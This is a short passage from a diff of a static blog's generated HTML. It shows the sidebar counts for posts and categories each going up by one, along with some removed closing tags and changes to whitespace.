-  </article>
-
-
-    
   </section>
 
   
@@ -2404,7 +2380,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">26</span>
+                    <span class="site-state-item-count">27</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -2437,7 +2413,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">10</span>
+                      
+                    
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
